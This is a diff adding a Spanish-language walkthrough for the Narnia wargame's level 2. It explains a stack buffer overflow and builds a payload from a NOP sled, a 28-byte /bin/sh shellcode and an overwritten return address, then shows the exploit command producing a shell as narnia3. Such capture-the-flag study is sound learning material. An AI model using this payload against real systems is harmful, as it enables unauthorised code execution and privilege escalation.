@@ -60,3 +60,17 @@ printf("%s", "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)                             
 --- SIGSEGV (Segmentation fault) ---
 +++ killed by SIGSEGV +++
 ```
+
+Ltrace nos muestra que strcpy intento copiar nuestras "A"s a la dirección `0xffffd5e8`(la posición de memoria de la memoria intermedia), que en little endian es: `\xe8\xd5\xff\xff`. Entonces tenemos el relleno, tenemos la dirección de retorno, ahora solo necesitamos el shellcode. Para esto, podemos usar el shellcode alfanumérico de ejemplo, o podemos encontrar el nuestro con una simple búsqueda en Google de "32 bit bin sh shellcode" ([http://shell-storm.org/shellcode/files/shellcode-821.php 2](http://shell-storm.org/shellcode/files/shellcode-827.php 2))
+Entonces, ahora para estructurar nuestra carga útil, la idea es aprovechar el hecho de que controlamos el contenido del búfer y también controlamos la dirección de retorno, por lo que si hacemos que el contenido del búfer sea malicioso y luego regresemos a la inicio del búfer, se ejecutará.
+
+Entonces, el primer paso es tener nuestro relleno, un nop (sin operación, \ x90), básicamente hace que la máquina no haga nada y pase a la siguiente instrucción, para que podamos llenar el inicio del búfer con nops, hasta nuestro código de shell .
+
+El shellcode ocupa un total de 28 bytes, y nuestro tamaño de búfer es de 128 bytes, por lo que es 100 nops (128-28), luego tenemos los 4 bytes de "basura", y luego la dirección de retorno, para resumshellcode
+\x90 x 100 + 28 (shellcode) + 4 (junk) + 4 (ret addr)
+
+Entonces, ahora sabemos cómo construir nuestra carga útil y podemos ejecutarla en el binario vulnerable:
+
+narnia2@narnia:/narnia$ ./narnia2 $(python -c 'print "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x90\x90\x90\x90" + "\xe8\xd5\xff\xff"')
+$ whoami
+narnia3
